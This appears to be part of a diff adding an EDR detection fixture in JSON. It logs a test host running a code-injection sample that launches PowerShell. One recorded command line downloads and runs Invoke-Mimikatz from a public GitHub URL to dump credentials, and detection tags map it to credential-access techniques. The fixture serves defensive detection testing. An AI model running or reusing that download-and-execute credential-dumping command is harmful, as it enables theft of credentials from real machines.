+            "contextTraceId": "3896e434-f47a-42c1-aae0-29e54b5c2f97",
+            "detectionDate": "2024-09-24T13:18:18Z",
+            "dtsId": "EDR",
+            "dtsType": "all",
+            "eventType": "Image Loaded",
+            "h_os": "windows",
+            "h_tp": "mar_4.2.1.4528",
+            "h_traceType": "all",
+            "h_version": "3.0",
+            "host": "7ZFW10RS5X64",
+            "it": 1,
+            "maGuid": "DF436252-767A-11EF-1B6F-005056A4FDFF",
+            "modules": [
+                {
+                    "fsattrs": 32,
+                    "loadTime": "2024-09-24T13:18:04.441Z",
+                    "name": "C:\\Windows\\System32\\ws2_32.dll",
+                    "sha256": "2C5047E0B7DAA607AA3971BD8C3E983297CEDE9C29DACF9C723BC253E288CED4",
+                    "vtpPrivileges": 1
+                },
+                {
+                    "fsattrs": 32,
+                    "loadTime": "2024-09-24T13:18:04.443Z",
+                    "name": "C:\\Windows\\System32\\bcrypt.dll",
+                    "sha256": "0AABF5C66FFDAA29D3747B9B2600DC279ACA7637B7916774BA4F191CA8AB382F",
+                    "vtpPrivileges": 1
+                }
+            ],
+            "pFullName": "C:\\Users\\cdaauto\\Desktop\\code-injection-sample.exe",
+            "pSha2": "EAA94C9E35D2EE3C003A4F636D5B67DF9644BB97D54325CD43E93FE10CB95146",
+            "parentTraceId": "8e0ae8e5-dd6c-4692-9abd-a082b20e020d",
+            "pid": 8252,
+            "ppid": 8252,
+            "rv": 4528,
+            "tags": [
+                "@AC.LoadedDLLs"
+            ],
+            "tenantId": "9AC56A98-FD6D-4C4F-BD8B-3E58CAAC30BE",
+            "time": "2024-09-24T13:18:04.441Z",
+            "traceId": "a66000ff-a7c4-4f09-b6bc-3ae0de0a99b5",
+            "uniqueRuleId": 18,
+            "version": "3.0"
+        },
+        {
+            "cmdLine": "powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/nciappo/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');\" Invoke-Mimikatz -DumpCreds",
+            "cmdLineMd5": "C3A4B3AEF6181F904FC3323DB633C096",
+            "cmdLineSha1": "EE7FF364A9FA23D7BF846B3F25A934E746037801",
+            "cmdLineSha256": "07ACABF1AB33B371BE61A659F9B7BF9EB4B1694C34FB4FE499C36F4AD44A5AFE",
+            "contextTraceId": "3896e434-f47a-42c1-aae0-29e54b5c2f97",
+            "detectionDate": "2024-09-24T13:18:18Z",
+            "dtsId": "EDR",
+            "dtsType": "all",
+            "eventType": "Process Created",
+            "h_os": "windows",
+            "h_tp": "mar_4.2.1.4528",
+            "h_traceType": "all",
+            "h_version": "3.0",
+            "host": "7ZFW10RS5X64",
+            "integrity": 3,
+            "interpreter": "powershell",
+            "it": 1,
+            "maGuid": "DF436252-767A-11EF-1B6F-005056A4FDFF",
+            "nonpeType": "commandline",
+            "pFullName": "C:\\Users\\cdaauto\\Desktop\\code-injection-sample.exe",
+            "pSha2": "DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C",
+            "parentTraceId": "c53abccc-0278-4580-b74c-7112da49ff6b",
+            "parentsTraceId": [
+                "c53abccc-0278-4580-b74c-7112da49ff6b",
+                "8e0ae8e5-dd6c-4692-9abd-a082b20e020d",
+                "1a017f04-231b-4eaf-b3da-126da184ce99"
+            ],
+            "pid": 8004,
+            "ppid": 7432,
+            "procFileAttrs": {
+                "creationDate": "2018-09-15T07:29:54.998Z",
+                "embedFileVersion": "10.0.17763.1 (WinBuild.160101.0800)",
+                "embedFilename": "PowerShell.EXE",
+                "embedProductName": "Microsoft® Windows® Operating System",
+                "embedProductVersion": "10.0.17763.1",
+                "embedVendorName": "Microsoft Corporation",
+                "md5": "7353F60B1739074EB17C5F4DDDEFE239",
+                "name": "powershell.exe",
+                "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                "reputation": {
+                    "reputation": 99,
+                    "vtpPrivileges": 1
+                },
+                "sha1": "6CBCE4A295C163791B60FC23D285E6D84F28EE4C",
+                "sha256": "DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C",
+                "size": 448000,
+                "subsystem": 3
+            },
+            "processName": "powershell.exe",
+            "rv": 4528,
+            "tags": [
+                "@AC.AdminHackingToolExecuted",
+                "@AC.ProcessCreated"
+            ],
+            "tdmRuleIds": [
+                99,
+                100000,
+                100007,
+                100009
+            ],
+            "tenantId": "9AC56A98-FD6D-4C4F-BD8B-3E58CAAC30BE",
+            "time": "2024-09-24T13:18:07.111Z",
+            "traceId": "f7f79d02-14d5-41c2-a6a2-a609f5d3b006",
+            "user": {
+                "domain": "CDA",
+                "id": "S-1-5-21-2561662139-2012859153-108931552-1137",
+                "name": "cdaauto"
+            },
+            "version": "3.0",
+            "severity": "s4",
+            "detectionsSets": [
+                {
+                    "sev": "s2",
+                    "tags": [
+                        "@ATA.DefenseEvasion",
+                        "@ATA.Execution",
+                        "@ATE.T1059",
+                        "@ATE.T1027",
+                        "@MSI._ps_privileged_operations"
+                    ]
+                },
+                {
+                    "sev": "s0",
+                    "tags": [
+                        "@ATA.Collection",
+                        "@ATE.T1074.001",
+                        "@MSI._process_local_data_staging"
+                    ]
+                },
+                {
+                    "sev": "s1",
+                    "tags": [
+                        "@ATA.DefenseEvasion",
+                        "@ATA.PrivilegeEscalation",
+                        "@ATA.Execution",
+                        "@ATA.CredentialAccess",
+                        "@ATE.T1134",
+                        "@ATE.T1106",
+                        "@ATE.T1003.001",
+                        "@MSI._api_tokenprivileges_lsass"
+                    ]
+                },
+                {
+                    "sev": "s4",
+                    "tags": [
+                        "@ATA.CredentialAccess",
+                        "@ATA.Execution",
+                        "@ATA.Persistence",
+                        "@ATA.PrivilegeEscalation",
+                        "@ATE.T1003.001",
+                        "@ATE.T1053.005",
+                        "@ATE.T1059.001",
+                        "@ATE.T1074.001",
+                        "@MSI._process_schtasks_mimikatz_creddump_via_powershell"
+                    ]
+                },
+                {
+                    "sev": "s2",
+                    "tags": [
+                        "@ATA.DefenseEvasion",
+                        "@ATA.Execution",
+                        "@ATE.T1059",
+                        "@ATE.T1027",
+                        "@MSI._ps_privileged_operations2"
+                    ]
+                },
+                {
+                    "sev": "s4",
+                    "tags": [
+                        "@ATA.Execution",
+                        "@ATA.CredentialAccess",
+                        "@ATE.T1059.001",
+                        "@ATE.T1003.001",
+                        "@ATE.T1074.001",
+                        "@MSI._malware_ps_creddumps"
+                    ]
+                },
+                {
+                    "sev": "s4",
+                    "tags": [
+                        "@ATA.CredentialAccess",
+                        "@ATA.Execution",
+                        "@ATE.T1003.004",
+                        "@ATE.T1059.001",
+                        "@ATE.T1074.001",
+                        "@MSI._hunting_powershell_mimikatz_execution"
+                    ]
+                },
+                {
+                    "sev": "s1",
+                    "tags": [
+                        "@ATA.Execution",
+                        "@ATA.CommandAndControl",
+                        "@ATE.T1059.001",
+                        "@ATE.T1105",
+                        "@ATE.T1071",
+                        "@MSI._process_psdownload"
+                    ]
+                },
+                {
+                    "sev": "s1",
+                    "tags": [
+                        "@ATA.LateralMovement",
+                        "@ATA.Execution",
+                        "@ATE.T1021.006",
+                        "@ATE.T1059.001",
+                        "@MSI._process_remote_invoke_command"
+                    ]
+                },
+                {
+                    "sev": "s4",
+                    "tags": [
+                        "@ATA.CredentialAccess",
+                        "@ATE.T1003.001",
+                        "@ATE.T1003.004",
+                        "@ATE.T1074.001",
+                        "@MSI._process_mimikatz_creddump"
+                    ]
+                },
+                {
+                    "sev": "s1",
+                    "tags": [
+                        "@ATA.PrivilegeEscalation",
+                        "@ATA.DefenseEvasion",
+                        "@ATA.Execution",
+                        "@ATE.T1134.001",
+                        "@ATE.T1134.002",
+                        "@ATE.T1134.003",
+                        "@ATE.T1068",
+                        "@ATE.T1059.001",
+                        "@MSI._ps_redteam_accesscontrol_nishang"
+                    ]
+                },
+                {
+                    "sev": "s0",
+                    "tags": [
+                        "@ATA.CredentialAccess",
+                        "@ATE.T1552.001",
+                        "@ATE.T1555.003",
+                        "@ATE.T1555.004",
+                        "@MSI._process_creds_edge"
+                    ]
+                },
+                {
+                    "sev": "s1",
+                    "tags": [
+                        "@ATA.PrivilegeEscalation",
+                        "@ATA.Execution",
+                        "@ATE.T1134",
+                        "@ATE.T1106",
+                        "@MSI._hunting_credential_access2"
+                    ]
+                },
+                {
+                    "sev": "s4",
+                    "tags": [
+                        "@ATA.CredentialAccess",
+                        "@ATA.Execution",
+                        "@ATE.T1003.004",
+                        "@ATE.T1059.001",
+                        "@ATE.T1074.001",
+                        "@MSI._process_remote_powershell_mimikatz_lsass"
+                    ]
+                },
+                {
+                    "sev": "s0",
+                    "tags": [
+                        "@ATA.Discovery",
+                        "@ATA.Execution",
+                        "@ATE.T1033",
+                        "@ATE.T1059.001",
+                        "@ATE.T1087.001",
+                        "@MSI._apt_process_PS_Get_userinfo"
+                    ]
+                },
+                {
+                    "sev": "s0",
+                    "tags": [
+                        "@ATA.Execution",
+                        "@ATE.T1059.001",
+                        "@MSI._process_psexecexpression"
+                    ]
+                },
+                {
+                    "sev": "s0",
+                    "tags": [
+                        "@ATA.Execution",
+                        "@ATA.LateralMovement",
+                        "@ATE.T1059.001",
+                        "@ATE.T1021.002",
+                        "@MSI._process_powershell_execute_remote_command"
+                    ]
+                },
+                {
+                    "sev": "s4",
+                    "tags": [
+                        "@ATA.CredentialAccess",
+                        "@ATA.Execution",
+                        "@ATE.T1003.004",
+                        "@ATE.T1059.001",
+                        "@ATE.T1074.001",
+                        "@MSI._process_ps_invoke_mimikatz_script"
+                    ]
+                },
+                {
+                    "sev": "s0",
+                    "tags": [
+                        "@ATA.Discovery",
+                        "@ATE.T1033",
+                        "@MSI._apt_process_whoami_high"
+                    ]
+                },
+                {
+                    "sev": "s0",
+                    "tags": [
+                        "@ATA.Collection",
+                        "@ATA.CredentialAccess",
+                        "@ATE.T1005",
+                        "@ATE.T1119",
+                        "@ATE.T1555.003",
+                        "@MSI._process_collect_browser_data_2"
+                    ]
+                },
+                {
+                    "sev": "s1",
+                    "tags": [
+                        "@ATA.CredentialAccess",
+                        "@ATA.Execution",
+                        "@ATE.T1003.004",
+                        "@ATE.T1059.001",
+                        "@ATE.T1074.001",
+                        "@MSI._process_ps_invoke_mimikatz"
+                    ]
+                },
+                {
+                    "sev": "s0",
+                    "tags": [
+                        "@ATA.Execution",
+                        "@ATA.Discovery",
+                        "@ATE.T1059.001",
+                        "@ATE.T1057",
+                        "@MSI._process_ps_get_process"
+                    ]
+                },
+                {
+                    "sev": "s1",
+                    "tags": [
+                        "@ATA.DefenseEvasion",
+                        "@ATA.Execution",
+                        "@ATE.T1059.001",
+                        "@ATE.T1620",
+                        "@MSI._ps_reflection_assembly"
+                    ]
+                },
+                {
+                    "sev": "s4",
+                    "tags": [
+                        "@ATA.CredentialAccess",
+                        "@ATA.LateralMovement",
+                        "@ATA.DefenseEvasion",
+                        "@ATA.Execution",
+                        "@ATE.T1003.001",
+                        "@ATE.T1003.002",
+                        "@ATE.T1003.003",
+                        "@ATE.T1003.004",
+                        "@ATE.T1003.005",
+                        "@ATE.T1003.006",
+                        "@ATE.T1003.007",
+                        "@ATE.T1003.008",
+                        "@ATE.T1558.001",
+                        "@ATE.T1558.002",
+                        "@ATE.T1552.001",
+                        "@ATE.T1552.002",
+                        "@ATE.T1552.004",
+                        "@ATE.T1552.006",
+                        "@ATE.T1550.002",
+                        "@ATE.T1550.003",
+                        "@ATE.T1059.001",
+                        "@MSI._ps_redteam_credaccess_nishang"
+                    ]
+                },
+                {
+                    "sev": "s0",
+                    "tags": [
+                        "@ATA.Discovery",
+                        "@ATA.Execution",
+                        "@ATE.T1082",
+                        "@ATE.T1016",
+                        "@ATE.T1059.001",
+                        "@ATE.T1047",
+                        "@MSI._apt_process_PS_win32_systeminfo"
+                    ]
+                },
+                {
+                    "sev": "s0",
+                    "tags": [
+                        "@ATA.Execution",
+                        "@ATA.DefenseEvasion",
+                        "@ATE.T1059.001",
+                        "@ATE.T1027",
+                        "@ATE.T1140",
+                        "@MSI._process_psobfuscation"
+                    ]
+                },
+                {
+                    "sev": "s0",
+                    "tags": [
+                        "@ATA.Discovery",
+                        "@ATA.Execution",
+                        "@ATE.T1033",
+                        "@ATE.T1069.001",
+                        "@ATE.T1059.001",
+                        "@ATE.T1087.001",
+                        "@MSI._apt_process_whoami_high_via_powershell"
+                    ]
+                },
+                {
+                    "sev": "s4",
+                    "tags": [
+                        "@ATA.CredentialAccess",
+                        "@ATA.Execution",
+                        "@ATE.T1003.001",
+                        "@ATE.T1059.001",
+                        "@ATE.T1074.001",
+                        "@MSI._exploit_mimikatz_dumpcreds"
+                    ]
+                },
+                {
+                    "sev": "s4",
+                    "tags": [
+                        "@ATA.Execution",
+                        "@ATA.CredentialAccess",
+                        "@ATE.T1059.001",
+                        "@ATE.T1003.001",
+                        "@ATE.T1074.001",
+                        "@MSI._malware_scripting_lsass_memory_read"
+                    ]
+                },
+                {
+                    "sev": "s0",
+                    "tags": [
+                        "@ATA.Execution",
+                        "@ATE.T1059.001",
+                        "@ATE.T1047",
+                        "@MSI._apt_process_gwmi"
+                    ]
+                },
+                {
+                    "sev": "s1",
+                    "tags": [
+                        "@ATA.Execution",
+                        "@ATA.DefenseEvasion",
+                        "@ATE.T1059.001",
+                        "@ATE.T1027",
+                        "@ATE.T1140",
+                        "@MSI._process_psobfuscation_frombase64"
+                    ]
+                },
+                {
+                    "sev": "s1",
+                    "tags": [
+                        "@ATA.DefenseEvasion",
+                        "@ATA.Execution",
+                        "@ATE.T1059",
+                        "@ATE.T1027",
+                        "@MSI._ps_pe_aware"
+                    ]
+                },
+                {
+                    "sev": "s0",
+                    "tags": [
+                        "@ATA.Discovery",
+                        "@ATA.Execution",
+                        "@ATE.T1082",
+                        "@ATE.T1059.001",
+                        "@MSI._apt_process_PS_env_systeminfo"
+                    ]
+                },
+                {
+                    "sev": "s4",
+                    "tags": [
+                        "@ATA.CredentialAccess",
+                        "@ATE.T1003.001",
+                        "@ATE.T1074.001",
+                        "@MSI._process_mimikatz_lsass_access"
+                    ]
+                },
+                {
+                    "sev": "s4",
+                    "tags": [
+                        "@ATA.CredentialAccess",
+                        "@ATA.Execution",
+                        "@ATE.T1003.004",
+                        "@ATE.T1059.001",
+                        "@ATE.T1074.001",
+                        "@MSI._process_suspicious_powershell_mimikatz_lsass"
+                    ]
+                },
+                {
+                    "sev": "s4",
+                    "tags": [
+                        "@ATA.CommandAndControl",
+                        "@ATA.Execution",
+                        "@ATE.T1102",
+                        "@ATE.T1059.001",
+                        "@MSI._process_powershell_download_public_repo"
+                    ]
+                },
+                {
+                    "sev": "s1",
+                    "tags": [
+                        "@ATA.CommandAndControl",
+                        "@ATE.T1102.003",
+                        "@MSI._process_public_repos"
+                    ]
+                },
+                {
+                    "sev": "s1",
+                    "tags": [
+                        "@ATA.CommandAndControl",
+                        "@ATA.Execution",
+                        "@ATE.T1105",
+                        "@ATE.T1059.001",
+                        "@MSI._malware_powershell_downloader_low"
+                    ]
+                },
+                {
+                    "sev": "s1",
+                    "tags": [
+                        "@ATA.Execution",
+                        "@ATA.CredentialAccess",
+                        "@ATE.T1003",
+                        "@MSI._process_accessed_lsass_high_0x1010"
+                    ]
+                },
+                {
+                    "sev": "s1",
+                    "tags": [
+                        "@ATA.Execution",
+                        "@ATA.DefenseEvasion",
+                        "@ATE.T1059.001",
+                        "@ATE.T1027",
+                        "@MSI._process_psobfuscation_character_tick"
+                    ]
+                }
+            ],
+            "endTime": null,
+            "originalSeverity": "s4",
+            "processCharacteristics": "",
+            "contained": "no",
+            "flagged": false,
+            "containedBy": "",
+            "summary": [
+                {
+                    "attribute": "cmdline",
+                    "attributeKey": "cmdLine",
+                    "label": "TRACE_TIMELINE.DETAILS.CMD_LINE",
+                    "summarizable": true,
+                    "shouldDisplayReadMore": true,
+                    "shouldDisplayCopyToClipboard": true
+                },
+                {
+                    "attribute": "domainName",
+                    "attributeKey": "user.domain",
+                    "label": "TRACE_TIMELINE.DETAILS.DOMAIN_NAME",
+                    "summarizable": true
+                },
+                {
+                    "attribute": "user",
+                    "attributeKey": "user.name",
+                    "label": "TRACE_TIMELINE.DETAILS.USER",
+                    "links": [
+                        {
+                            "label": "TRACE_TIMELINE.DRILL_DOWN_LINKS.PROCESS_USER_ONE",
+                            "searchTarget": [
+                                "${maGuid}"
+                            ],
+                            "searchHostname": [
+                                "${hostname}"
+                            ],
+                            "drillDownKey": "PROCESS_USER_ONE",
+                            "searchQuery": {
+                                "projections": [
+                                    {
+                                        "name": "Processes",
+                                        "outputs": [
+                                            "id",
+                                            "name",
+                                            "cmdline",
+                                            "parentid",
+                                            "parentname",
+                                            "sha1",
+                                            "md5",
+                                            "user"
+                                        ]
+                                    }
+                                ],
+                                "condition": {
+                                    "or": [
+                                        {
+                                            "and": [
+                                                {
+                                                    "name": "Processes",
+                                                    "output": "user",
+                                                    "op": "ENDS_WITH",
+                                                    "value": "${user}"
+                                                }
+                                            ]
+                                        }
+                                    ]
+                                }
+                            }
+                        },
+                        {
+                            "label": "TRACE_TIMELINE.DRILL_DOWN_LINKS.PROCESS_USER_ALL",
+                            "searchQuery": {
+                                "projections": [
+                                    {
+                                        "name": "HostInfo",
+                                        "outputs": [
+                                            "hostname",
+                                            "ip_address"
+                                        ]
+                                    },
+                                    {
+                                        "name": "Processes",
+                                        "outputs": [
+                                            "id",
+                                            "name",
+                                            "cmdline",
+                                            "parentid",
+                                            "parentname",
+                                            "sha1",
+                                            "md5",
+                                            "user"
+                                        ]
+                                    }
+                                ],
+                                "condition": {
+                                    "or": [
+                                        {
+                                            "and": [
+                                                {
+                                                    "name": "Processes",
+                                                    "output": "user",
+                                                    "op": "ENDS_WITH",
+                                                    "value": "${user}"
+                                                }
+                                            ]
+                                        }
+                                    ]
+                                }
+                            }
+                        },
+                        {
+                            "label": "TRACE_TIMELINE.DRILL_DOWN_LINKS.LOGGED_USER_ALL",
+                            "searchQuery": {
+                                "projections": [
+                                    {
+                                        "name": "HostInfo",
+                                        "outputs": [
+                                            "hostname",
+                                            "ip_address"
+                                        ]
+                                    },
+                                    {
+                                        "name": "LoggedInUsers"
+                                    }
+                                ],
+                                "condition": {
+                                    "or": [
+                                        {
+                                            "and": [
+                                                {
+                                                    "name": "LoggedInUsers",
+                                                    "output": "username",
+                                                    "op": "EQUALS",
+                                                    "value": "${user}"
+                                                }
+                                            ]
+                                        }
+                                    ]
+                                }
+                            }
+                        }
+                    ],
+                    "summarizable": true
+                }
+            ],
+            "pidTraceId": "f7f79d02-14d5-41c2-a6a2-a609f5d3b006",
+            "lastActivityTime": "2024-09-24T13:18:08.046Z",
+            "reputationInfo": {
+                "reason": ""
+            }
+        },
+        {
+            "contextTraceId": "3896e434-f47a-42c1-aae0-29e54b5c2f97",
+            "detectionDate": "2024-09-24T13:18:48Z",
+            "dtsId": "EDR",
+            "dtsType": "all",
+            "eventType": "File Deleted",
+            "fileAttributes": {
+                "creationDate": "2024-09-24T13:18:04.476Z",
+                "embedFileVersion": "9.00.30729.9415",
+                "embedFilename": "MSVCP90.DLL",
+                "embedProductName": "Microsoft® Visual Studio® 2008",
+                "embedProductVersion": "9.00.30729.9415",
+                "embedVendorName": "Microsoft Corporation",
+                "fileType": "PE",
+                "fsattrs": 32,
+                "lastModificationDate": "2024-09-24T13:18:04.476Z",
+                "md5": "6FDF6DE3C560C05EAEA544EFFC462C22",
+                "name": "msvcp90.dll",
+                "path": "C:\\Users\\cdaauto\\AppData\\Local\\Temp\\_MEI82522\\msvcp90.dll",
+                "sha1": "4409F68AC0BB71B7D9CC1929576E66DC2A0FA3BF",
+                "sha256": "0EA812448EA5EB1A7B3D6E1DD4D2425C7FA5474E25C89BC561828930D58D5F8F",
+                "size": 854160
+            },
+            "h_os": "windows",
+            "h_tp": "mar_4.2.1.4528",
+            "h_traceType": "all",
+            "h_version": "3.0",
+            "host": "7ZFW10RS5X64",
+            "it": 1,
+            "maGuid": "DF436252-767A-11EF-1B6F-005056A4FDFF",
+            "pFullName": "C:\\Users\\cdaauto\\Desktop\\code-injection-sample.exe",
+            "pSha2": "EAA94C9E35D2EE3C003A4F636D5B67DF9644BB97D54325CD43E93FE10CB95146",
+            "parentTraceId": "8e0ae8e5-dd6c-4692-9abd-a082b20e020d",
+            "pid": 8252,
+            "ppid": 8252,
+            "rv": 4528,
+            "tags": [
+                "@AC.PECreated"
+            ],
+            "tenantId": "9AC56A98-FD6D-4C4F-BD8B-3E58CAAC30BE",
+            "time": "2024-09-24T13:18:14.771Z",
+            "traceId": "069d83c9-146c-4a0e-ba31-c3a2c9bd49f2",
+            "uniqueRuleId": 36,
+            "version": "3.0",
+            "action": "",
+            "productId": "",
+            "description": ""
+        },
+        {
+            "api": {
+                "arguments": [
+                    "0xaaff8a62d8",
+                    "0x8",
+                    "0x0"
+                ],
+                "data": "AAC92fcBAAA=",
+                "moduleName": "",
+                "name": "WriteProcessMemory",
+                "result": "0",
+                "targetPid": 7432,
+                "targetProcessFull": "C:\\Users\\cdaauto\\Desktop\\code-injection-sample.exe"
+            },
+            "contextTraceId": "3896e434-f47a-42c1-aae0-29e54b5c2f97",
+            "detectionDate": "2024-09-24T13:18:18Z",
+            "dtsId": "EDR",
+            "dtsType": "all",
+            "eventType": "Api",
+            "h_os": "windows",
+            "h_tp": "mar_4.2.1.4528",
+            "h_traceType": "all",
+            "h_version": "3.0",
+            "host": "7ZFW10RS5X64",
+            "it": 1,
+            "maGuid": "DF436252-767A-11EF-1B6F-005056A4FDFF",
+            "pFullName": "C:\\Users\\cdaauto\\Desktop\\code-injection-sample.exe",
+            "pSha2": "EAA94C9E35D2EE3C003A4F636D5B67DF9644BB97D54325CD43E93FE10CB95146",
+            "parentTraceId": "8e0ae8e5-dd6c-4692-9abd-a082b20e020d",
+            "pid": 8252,
+            "ppid": 8252,
+            "rv": 4528,
+            "tags": [
+                "@AC.APICall"
+            ],
+            "tenantId": "9AC56A98-FD6D-4C4F-BD8B-3E58CAAC30BE",
+            "time": "2024-09-24T13:18:04.523Z",
+            "traceId": "b8841433-20fc-4c32-b854-fcb90ac8ebf4",
+            "uniqueRuleId": 11,
+            "version": "3.0",
+            "action": "",
+            "productId": "",
+            "description": ""
+        },
+        {
+            "cmdLine": "\"C:\\Users\\cdaauto\\Desktop\\code-injection-sample.exe\" ",
+            "contextTraceId": "3896e434-f47a-42c1-aae0-29e54b5c2f97",
+            "detectionDate": "2024-09-24T13:18:18Z",
+            "dtsId": "EDR",
+            "dtsType": "all",
+            "eventType": "Process Created",
+            "h_os": "windows",
+            "h_tp": "mar_4.2.1.4528",
+            "h_traceType": "all",
+            "h_version": "3.0",
+            "host": "7ZFW10RS5X64",
+            "integrity": 3,
+            "it": 1,
+            "maGuid": "DF436252-767A-11EF-1B6F-005056A4FDFF",
+            "pFullName": "C:\\Users\\cdaauto\\Desktop\\code-injection-sample.exe",
+            "pSha2": "EAA94C9E35D2EE3C003A4F636D5B67DF9644BB97D54325CD43E93FE10CB95146",
+            "parentTraceId": "8e0ae8e5-dd6c-4692-9abd-a082b20e020d",
+            "parentsTraceId": [
+                "8e0ae8e5-dd6c-4692-9abd-a082b20e020d",
+                "1a017f04-231b-4eaf-b3da-126da184ce99"
+            ],
+            "pid": 7432,
+            "ppid": 8252,
+            "procFileAttrs": {
+                "creationDate": "2024-09-20T15:28:22.296Z",
+                "md5": "E2E43E9D0C479E0E5D41BCB4EA9FA1B4",
+                "name": "code-injection-sample.exe",
+                "path": "C:\\Users\\cdaauto\\Desktop\\code-injection-sample.exe",
+                "sha1": "28E9D7E4158FCFBAC28A9187390AB7918CE08F44",
+                "sha256": "EAA94C9E35D2EE3C003A4F636D5B67DF9644BB97D54325CD43E93FE10CB95146",
+                "size": 3971501,
+                "subsystem": 3
+            },
+            "processName": "code-injection-sample.exe",
+            "rv": 4528,
+            "tags": [
+                "@AC.ProcessCreated"
+            ],
+            "tdmRuleIds": [
+                108,
+                100000,
+                100002,
+                100003,
+                100005
+            ],
+            "tenantId": "9AC56A98-FD6D-4C4F-BD8B-3E58CAAC30BE",
+            "time": "2024-09-24T13:18:04.531Z",
+            "traceId": "c53abccc-0278-4580-b74c-7112da49ff6b",
+            "user": {
+                "domain": "CDA",
+                "id": "S-1-5-21-2561662139-2012859153-108931552-1137",
+                "name": "cdaauto"
+            },
+            "version": "3.0",
+            "severity": "s0",
+            "detectionsSets": [
+                {
+                    "sev": "s0",
+                    "tags": [
+                        "@ATA.Execution",
+                        "@MSI._process_suspicious_path"
+                    ]
+                }
+            ],
+            "endTime": null,
+            "originalSeverity": "s0",
+            "processCharacteristics": "",
+            "contained": "no",
+            "flagged": false,
+            "containedBy": "",
+            "summary": [
+                {
+                    "attribute": "cmdline",
+                    "attributeKey": "cmdLine",
+                    "label": "TRACE_TIMELINE.DETAILS.CMD_LINE",
+                    "summarizable": true,
+                    "shouldDisplayReadMore": true,
+                    "shouldDisplayCopyToClipboard": true
+                },
+                {
+                    "attribute": "domainName",
+                    "attributeKey": "user.domain",
+                    "label": "TRACE_TIMELINE.DETAILS.DOMAIN_NAME",
+                    "summarizable": true
+                },
+                {
+                    "attribute": "user",
+                    "attributeKey": "user.name",
+                    "label": "TRACE_TIMELINE.DETAILS.USER",
+                    "links": [
+                        {
+                            "label": "TRACE_TIMELINE.DRILL_DOWN_LINKS.PROCESS_USER_ONE",
+                            "searchTarget": [
+                                "${maGuid}"
+                            ],
+                            "searchHostname": [
+                                "${hostname}"
+                            ],
+                            "drillDownKey": "PROCESS_USER_ONE",
+                            "searchQuery": {
+                                "projections": [
+                                    {
+                                        "name": "Processes",
+                                        "outputs": [
+                                            "id",
+                                            "name",
+                                            "cmdline",
+                                            "parentid",
+                                            "parentname",
+                                            "sha1",
+                                            "md5",
+                                            "user"
+                                        ]
+                                    }
+                                ],
+                                "condition": {
+                                    "or": [
+                                        {
+                                            "and": [
+                                                {
+                                                    "name": "Processes",
+                                                    "output": "user",
+                                                    "op": "ENDS_WITH",
+                                                    "value": "${user}"
+                                                }
+                                            ]
+                                        }
+                                    ]
+                                }
+                            }
+                        },
+                        {
+                            "label": "TRACE_TIMELINE.DRILL_DOWN_LINKS.PROCESS_USER_ALL",
+                            "searchQuery": {
+                                "projections": [
+                                    {
+                                        "name": "HostInfo",
+                                        "outputs": [
+                                            "hostname",
+                                            "ip_address"
+                                        ]
+                                    },
+                                    {
+                                        "name": "Processes",
+                                        "outputs": [
+                                            "id",
+                                            "name",
+                                            "cmdline",
+                                            "parentid",
+                                            "parentname",
+                                            "sha1",
+                                            "md5",
+                                            "user"
+                                        ]
+                                    }
+                                ],
+                                "condition": {
+                                    "or": [
+                                        {
+                                            "and": [
+                                                {
+                                                    "name": "Processes",
+                                                    "output": "user",
+                                                    "op": "ENDS_WITH",
+                                                    "value": "${user}"
+                                                }
+                                            ]
+                                        }
+                                    ]
+                                }
+                            }
+                        },
+                        {
+                            "label": "TRACE_TIMELINE.DRILL_DOWN_LINKS.LOGGED_USER_ALL",
+                            "searchQuery": {
+                                "projections": [
+                                    {
+                                        "name": "HostInfo",
+                                        "outputs": [
+                                            "hostname",
+                                            "ip_address"
+                                        ]
+                                    },
+                                    {
+                                        "name": "LoggedInUsers"
+                                    }
+                                ],
+                                "condition": {
+                                    "or": [
+                                        {
+                                            "and": [
+                                                {
+                                                    "name": "LoggedInUsers",
+                                                    "output": "username",
+                                                    "op": "EQUALS",
+                                                    "value": "${user}"
+                                                }
+                                            ]
+                                        }
+                                    ]
+                                }
+                            }
+                        }
+                    ],
+                    "summarizable": true
+                }
+            ],
+            "pidTraceId": "c53abccc-0278-4580-b74c-7112da49ff6b",
+            "lastActivityTime": "2024-09-24T13:18:07.111Z",
+            "reputationInfo": {
+                "reason": ""
+            }
+        },
+        {
+            "contextTraceId": "3896e434-f47a-42c1-aae0-29e54b5c2f97",
+            "detectionDate": "2024-09-24T13:18:48Z",
+            "dtsId": "EDR",
+            "dtsType": "all",
+            "eventType": "File Deleted",
+            "fileAttributes": {
+                "creationDate": "2024-09-24T13:18:04.491Z",
+                "embedFileVersion": "9.00.30729.9415",
+                "embedFilename": "MSVCR90.DLL",
+                "embedProductName": "Microsoft® Visual Studio® 2008",
+                "embedProductVersion": "9.00.30729.9415",
+                "embedVendorName": "Microsoft Corporation",
+                "fileType": "PE",
+                "fsattrs": 32,
+                "lastModificationDate": "2024-09-24T13:18:04.491Z",
+                "md5": "4476B0E481817DBF743025643130802A",
+                "name": "msvcr90.dll",
+                "path": "C:\\Users\\cdaauto\\AppData\\Local\\Temp\\_MEI82522\\msvcr90.dll",
+                "sha1": "6A9AB843A853F4F053A53631DD26B2D83AB5DF92",
+                "sha256": "BE19717A32F8ED4ADEC5C4E4A315797FD06827F49824C72BB26E797264DC6C06",
+                "size": 642192
+            },
+            "h_os": "windows",
+            "h_tp": "mar_4.2.1.4528",
+            "h_traceType": "all",
+            "h_version": "3.0",
+            "host": "7ZFW10RS5X64",
+            "it": 1,
+            "maGuid": "DF436252-767A-11EF-1B6F-005056A4FDFF",
+            "pFullName": "C:\\Users\\cdaauto\\Desktop\\code-injection-sample.exe",
+            "pSha2": "EAA94C9E35D2EE3C003A4F636D5B67DF9644BB97D54325CD43E93FE10CB95146",
+            "parentTraceId": "8e0ae8e5-dd6c-4692-9abd-a082b20e020d",
+            "pid": 8252,
+            "ppid": 8252,
+            "rv": 4528,
+            "tags": [
+                "@AC.PECreated"
+            ],
+            "tenantId": "9AC56A98-FD6D-4C4F-BD8B-3E58CAAC30BE",
+            "time": "2024-09-24T13:18:14.772Z",
+            "traceId": "30ea76ef-1463-4d9a-bbd5-f45b79e94e5e",
+            "uniqueRuleId": 36,
+            "version": "3.0",
+            "action": "",
